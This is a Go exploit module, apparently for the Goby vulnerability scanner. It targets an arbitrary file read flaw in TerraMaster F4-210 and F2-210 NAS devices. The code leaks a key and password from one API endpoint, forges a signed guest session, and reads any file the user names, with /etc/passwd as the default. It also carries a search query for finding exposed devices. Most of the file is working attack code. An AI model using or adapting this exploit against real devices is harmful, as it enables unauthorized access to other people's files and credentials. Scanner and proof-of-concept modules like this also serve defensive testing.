package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Terramaster F4-210 fileDownload components Arbitrary File Read Vulnerability",
    "Description": "<p>TerraMaster F2-210 and F4-210 are NAS (Network Attached Storage) devices of Terramaster, Shenzhen, China.</p><p>TerraMaster F2-210 and F4-210 have arbitrary file reading vulnerabilities. Attackers can read arbitrary files and obtain sensitive information through sensitive information leaks and fake sessions.</p>",
    "Impact": "<p>Terramaster F4-210 Arbitrary File Read</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.terra-master.com/cn/\">https://www.terra-master.com/cn/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "TerraMaster F4-210",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Terramaster 存储设备 F4-210 fileDownload 组件任意文件读取漏洞",
            "Product": "TerraMaster F4-210",
            "Description": "<p>TerraMaster F2-210和F4-210是中国深圳市图美电子技术（Terramaster）公司的NAS（网络附属存储）设备。</p><p>TerraMaster F2-210和F4-210存在任意文件读取漏洞，攻击者可通过敏感信息泄露伪造session来读取任意文件，获取敏感信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.terra-master.com/cn/\">https://www.terra-master.com/cn/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>TerraMaster F2-210和F4-210存在任意文件读取漏洞，攻击者可通过敏感信息泄露伪造session来读取任意文件，获取敏感信息。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Terramaster F4-210 fileDownload components Arbitrary File Read Vulnerability",
            "Product": "TerraMaster F4-210",
            "Description": "<p>TerraMaster F2-210 and F4-210 are NAS (Network Attached Storage) devices of Terramaster, Shenzhen, China.</p><p>TerraMaster F2-210 and F4-210 have arbitrary file reading vulnerabilities. Attackers can read arbitrary files and obtain sensitive information through sensitive information leaks and fake sessions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.terra-master.com/cn/\">https://www.terra-master.com/cn/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Terramaster F4-210 Arbitrary File Read</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "title=\"TOS Loading\"",
    "GobyQuery": "title=\"TOS Loading\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.terra-master.com/cn/",
    "DisclosureDate": "2022-01-04",
    "References": [
        "https://packetstormsecurity.com/files/165399/terramaster-exec.py.txt"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10250"
}`

	tos_encrypt_strfsakl := func(key, toencrypt string) string {
		Str1 := key + toencrypt
		return fmt.Sprintf("%x", md5.Sum([]byte(Str1)))
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/module/api.php?mobile/wapNasIPS"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("user-agent", "TNAS")
			cfg1.Header.Store("user-device", "TNAS")
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "PWD") && strings.Contains(resp.RawBody, "ADDR") {
					KeyFind := regexp.MustCompile("\"ADDR\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
					Key1 := KeyFind[1][6:]
					PWDFind := regexp.MustCompile("\"PWD\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
					timestamp1 := fmt.Sprintf("%v", time.Now().Unix())
					signature1 := tos_encrypt_strfsakl(Key1, timestamp1)
					kod_token1 := tos_encrypt_strfsakl(Key1, "")
					uri2 := "/module/api.php?mobile/fileDownload"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("user-agent", "TNAS")
					cfg2.Header.Store("user-device", "TNAS")
					cfg2.Header.Store("signature", signature1)
					cfg2.Header.Store("timestamp", timestamp1)
					cfg2.Header.Store("authorization", PWDFind[1])
					cfg2.Header.Store("Cookie", "kod_name=guest; kod_token="+kod_token1)
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg2.Data = `path=%2Fetc%2Fpasswd`
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						return resp2.StatusCode == 200 && regexp.MustCompile("root:(x*?):0:0:").MatchString(resp2.RawBody)
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri1 := "/module/api.php?mobile/wapNasIPS"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("user-agent", "TNAS")
			cfg1.Header.Store("user-device", "TNAS")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "PWD") && strings.Contains(resp.RawBody, "ADDR") {
					KeyFind := regexp.MustCompile("\"ADDR\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
					Key1 := KeyFind[1][6:]
					PWDFind := regexp.MustCompile("\"PWD\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
					timestamp1 := fmt.Sprintf("%v", time.Now().Unix())
					signature1 := tos_encrypt_strfsakl(Key1, timestamp1)
					kod_token1 := tos_encrypt_strfsakl(Key1, "")
					uri2 := "/module/api.php?mobile/fileDownload"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("user-agent", "TNAS")
					cfg2.Header.Store("user-device", "TNAS")
					cfg2.Header.Store("signature", signature1)
					cfg2.Header.Store("timestamp", timestamp1)
					cfg2.Header.Store("authorization", PWDFind[1])
					cfg2.Header.Store("Cookie", "kod_name=guest; kod_token="+kod_token1)
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg2.Data = `path=` + url.QueryEscape(cmd)
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
						expResult.Output = resp2.RawBody
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
